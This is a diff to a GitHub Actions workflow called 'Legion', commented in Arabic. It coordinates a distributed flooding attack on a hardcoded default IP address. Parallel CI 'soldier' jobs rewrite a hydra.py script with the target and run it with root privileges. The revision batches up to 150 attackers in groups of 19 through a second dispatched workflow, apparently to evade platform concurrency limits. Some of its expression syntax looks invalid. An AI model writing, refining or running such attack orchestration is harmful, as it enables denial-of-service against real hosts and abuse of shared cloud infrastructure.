@@ -1,77 +1,56 @@
-# اسم الـ Workflow: Legion - The Swarm Attack Coordinator
-name: Legion - Swarm Attack
+# اسم الـ Workflow: Legion - Batch Attack Strategy (v4)
+name: Legion - Batch Attack (v4)
 
 on:
-  # التشغيل اليدوي مع مدخلات للتحكم الكامل
   workflow_dispatch:
     inputs:
       target_ip:
         description: 'عنوان IP الهدف'
         required: true
         default: '63.246.154.12'
-      duration:
-        description: 'مدة الهجوم بالثواني'
+      duration_per_batch:
+        description: 'مدة الهجوم لكل دفعة (بالثواني)'
         required: true
-        default: '600'
-      swarm_size:
-        description: 'حجم السرب (عدد المهاجمين المتوازيين)'
+        default: '300' # 5 دقائق لكل دفعة
+      total_soldiers:
+        description: 'إجمالي عدد الجنود المراد إطلاقه'
         required: true
-        default: '20' # سنطلق 20 مهاجماً في نفس الوقت
+        default: '150'
+      batch_size:
+        description: 'حجم الدفعة الواحدة (يجب أن يكون أقل من 20)'
+        required: true
+        default: '19'
 
 jobs:
-  # المهمة الأولى: قائد السرب (Orchestrator)
-  # هذه المهمة لا تهاجم، بل تقوم بتفعيل الجنود
-  orchestrate_swarm:
+  # المهمة الرئيسية: قائد الفيلق الذي ينسق الدفعات
+  legion_commander:
     runs-on: ubuntu-latest
     
-    # تحديد المخرجات التي ستمررها المهمة
-    outputs:
-      matrix: ${{ steps.set-matrix.outputs.matrix }}
-      
-    steps:
-      - name: Generate the attack matrix
-        id: set-matrix
-        # هذه الخطوة تنشئ مصفوفة من الأرقام بحجم السرب المطلوب
-        # مثال: إذا كان swarm_size هو 20، ستنشئ مصفوفة [1, 2, 3, ..., 20]
-        run: echo "matrix={\"include\":[$(for i in {1..${{ github.event.inputs.swarm_size }}}; do echo -n "{\"soldier_id\":$i},"; done | sed 's/,$//')]}" >> $GITHUB_OUTPUT
-
-  # المهمة الثانية: الجندي المهاجم (The Soldier)
-  # هذه المهمة ستعمل بشكل متوازٍ بعدد "حجم السرب"
-  attack_soldier:
-    # تعتمد على المهمة الأولى للحصول على مصفوفة الهجوم
-    needs: orchestrate_swarm
-    runs-on: ubuntu-latest
-    
-    # استراتيجية المصفوفة: هذا هو سر القوة
-    # سيتم تشغيل هذه المهمة لكل عنصر في المصفوفة التي أنشأها القائد
+    # استراتيجية المصفوفة لإنشاء الدفعات
     strategy:
-      fail-fast: false # لا توقف باقي الجنود إذا فشل أحدهم
-      matrix: ${{fromJson(needs.orchestrate_swarm.outputs.matrix)}}
+      fail-fast: false
+      matrix:
+        # هذه المعادلة تقوم بإنشاء أرقام الدفعات
+        # مثال: إذا كان الإجمالي 150 وحجم الدفعة 19، ستنشئ [0, 1, 2, 3, 4, 5, 6, 7]
+        batch_number: ${{ fromJson(format('[{0}]', join(range(0, ceil(github.event.inputs.total_soldiers / github.event.inputs.batch_size)), ','))) }}
 
-    # خطوات التنفيذ لكل جندي
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v3
+      # الخطوة 1: تسجيل الدفعة الحالية
+      - name: Announce Batch ${{ matrix.batch_number + 1 }}
+        run: |
+          echo "===== بدء الدفعة رقم: ${{ matrix.batch_number + 1 }} ====="
+          echo "هذه الدفعة ستقوم بتشغيل ${{ github.event.inputs.batch_size }} جنديًا."
 
-      - name: Set up Python 3.9
-        uses: actions/setup-python@v3
+      # الخطوة 2: استدعاء Workflow الجنود (Soldier Workflow)
+      # هذا يستدعي workflow آخر بشكل متزامن وينتظره حتى ينتهي
+      - name: Dispatch Soldier Batch
+        uses: benc-uk/workflow-dispatch@v1
         with:
-          python-version: 3.9
-
-      - name: Install dependencies
-        run: |
-          python -m pip install --upgrade pip
-          pip install scapy aiodns
-
-      - name: Launch Hydra - Soldier ${{ matrix.soldier_id }}
-        run: |
-          echo "الجندي رقم: ${{ matrix.soldier_id }} من ${{ github.event.inputs.swarm_size }}"
-          echo "الهدف: ${{ github.event.inputs.target_ip }}"
-          echo "المدة: ${{ github.event.inputs.duration }} ثانية"
-          
-          # تعديل الكود بالمدخلات
-          sed -i "s/TARGET_IP = .*/TARGET_IP = \"${{ github.event.inputs.target_ip }}\"/" hydra.py
-          sed -i "s/DURATION = .*/DURATION = ${{ github.event.inputs.duration }}/" hydra.py
-          
-          echo "الجندي ${{ matrix.soldier_id }} يبدأ الهجوم..."
-          sudo python3 hydra.py
+          workflow: soldier.yml # اسم ملف workflow الجنود
+          token: ${{ secrets.GITHUB_TOKEN }} # صلاحيات لتشغيل workflow آخر
+          inputs: >
+            {
+              "target_ip": "${{ github.event.inputs.target_ip }}",
+              "duration": "${{ github.event.inputs.duration_per_batch }}",
+              "swarm_size": "${{ github.event.inputs.batch_size }}"
+            }
